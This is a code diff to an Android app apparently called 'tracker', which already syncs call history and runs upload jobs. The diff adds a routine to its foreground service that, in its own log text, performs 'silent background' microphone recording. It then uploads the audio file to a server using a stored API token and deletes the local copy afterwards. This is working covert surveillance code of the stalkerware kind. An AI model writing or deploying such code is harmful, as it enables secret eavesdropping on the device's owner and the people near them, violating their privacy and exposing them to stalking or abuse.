@@ -18,6 +18,9 @@ import java.util.concurrent.atomic.AtomicReference;
 import com.tracker.app.jobs.CallHistorySyncJobService;
 import com.tracker.app.jobs.HeartbeatJobService;
 import com.tracker.app.jobs.UploadJobService;
+import android.media.MediaRecorder;
+import android.content.SharedPreferences;
+import com.tracker.app.net.ApiClient;
 
 /**
  * Foreground service required by Android to keep background services alive.
@@ -223,12 +226,113 @@ public class MonitoringForegroundService extends Service {
         }
     }
 
+    private boolean isRecordingAudio = false;
+    private MediaRecorder mediaRecorder = null;
+
+    public synchronized void startAudioRecording(final int durationSeconds) {
+        if (isRecordingAudio) {
+            Log.w(TAG, "Audio recording is already in progress. Ignoring request.");
+            return;
+        }
+
+        Log.d(TAG, "Starting silent background audio recording for " + durationSeconds + " seconds.");
+        isRecordingAudio = true;
+
+        new Thread(() -> {
+            File cacheDir = getCacheDir();
+            final File audioFile = new File(cacheDir, "audio_rec_" + System.currentTimeMillis() + ".mp4");
+
+            try {
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                    mediaRecorder = new MediaRecorder(getApplicationContext());
+                } else {
+                    mediaRecorder = new MediaRecorder();
+                }
+
+                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
+                mediaRecorder.prepare();
+                mediaRecorder.start();
+
+                Log.d(TAG, "MediaRecorder started successfully. File: " + audioFile.getAbsolutePath());
+
+                // Wait for the duration to complete
+                Thread.sleep(durationSeconds * 1000L);
+
+                // Stop recording
+                stopAndUploadAudio(audioFile, durationSeconds);
+
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to capture audio recording", e);
+                cleanupRecorder(audioFile);
+            }
+        }).start();
+    }
+
+    private synchronized void stopAndUploadAudio(File audioFile, int durationSeconds) {
+        if (mediaRecorder != null) {
+            try {
+                mediaRecorder.stop();
+                mediaRecorder.release();
+            } catch (Exception e) {
+                Log.e(TAG, "Error stopping MediaRecorder", e);
+            }
+            mediaRecorder = null;
+        }
+        isRecordingAudio = false;
+
+        // Upload the file in a background thread
+        new Thread(() -> {
+            try {
+                SharedPreferences prefs = getSharedPreferences("tracker_prefs", MODE_PRIVATE);
+                String apiToken = prefs.getString("api_token", null);
+                if (apiToken != null && audioFile.exists()) {
+                    Log.d(TAG, "Uploading audio recording file...");
+                    boolean success = ApiClient.uploadAudio(apiToken, audioFile, durationSeconds);
+                    if (success) {
+                        Log.d(TAG, "Audio recording uploaded successfully.");
+                        audioFile.delete();
+                    } else {
+                        Log.e(TAG, "Failed to upload audio recording to server.");
+                        audioFile.delete();
+                    }
+                } else {
+                    audioFile.delete();
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error during audio upload", e);
+                if (audioFile.exists()) {
+                    audioFile.delete();
+                }
+            }
+        }).start();
+    }
+
+    private synchronized void cleanupRecorder(File file) {
+        if (mediaRecorder != null) {
+            try {
+                mediaRecorder.reset();
+                mediaRecorder.release();
+            } catch (Exception e) {
+                // Ignore
+            }
+            mediaRecorder = null;
+        }
+        isRecordingAudio = false;
+        if (file != null && file.exists()) {
+            file.delete();
+        }
+    }
+
     @Override
     public void onDestroy() {
         if (periodicTimer != null) {
             periodicTimer.cancel();
             periodicTimer = null;
         }
+        cleanupRecorder(null);
         instance = null;
         super.onDestroy();
     }
